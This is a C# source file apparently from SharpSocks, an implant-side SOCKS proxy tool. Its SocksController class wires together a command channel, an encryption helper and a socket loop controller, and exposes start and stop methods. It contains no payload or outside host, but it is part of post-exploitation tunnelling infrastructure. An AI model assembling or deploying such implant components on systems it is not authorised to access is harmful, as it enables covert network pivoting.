using System;
using SharpSocksCommon.Encryption;
using SharpSocksImplant.Comms;
using SharpSocksImplant.Config;
using SharpSocksImplant.Logging;

namespace SharpSocksImplant.Socks
{
    public class SocksController
    {
        private readonly SocksClientConfiguration _config;
        private CommandChannelController _cmdChannel;
        private CommandCommunicationHandler _cmdCommsHandler;
        private SocksLoopController _sockLoopController;

        public SocksController(SocksClientConfiguration config)
        {
            _config = config;
        }

        public IEncryptionHelper Encryptor { get; set; }

        public IImplantLog ImplantComms { get; set; }

        public void Initialize()
        {
            try
            {
                _cmdCommsHandler = new CommandCommunicationHandler(Encryptor, _config)
                {
                    ImplantComms = ImplantComms
                };
                _sockLoopController = new SocksLoopController
                {
                    CmdCommsHandler = _cmdCommsHandler,
                    ImplantComms = ImplantComms,
                    TimeBetweenReads = _config.TimeBetweenReads,
                };
                _cmdChannel = new CommandChannelController(_config.commandChannel, _sockLoopController, _cmdCommsHandler)
                {
                    ImplantComms = ImplantComms
                };
            }
            catch (Exception e)
            {
                ImplantComms.LogError($"Failed to derive server key {e}");
            }
        }

        public void Start()
        {
            _cmdChannel.StartCommandLoop(this);
        }

        public void StopProxyComms()
        {
            _sockLoopController.StopAll();
        }

        public void Stop()
        {
            _cmdChannel.StopCommandChannel();
            _sockLoopController.StopAll();
        }
    }
}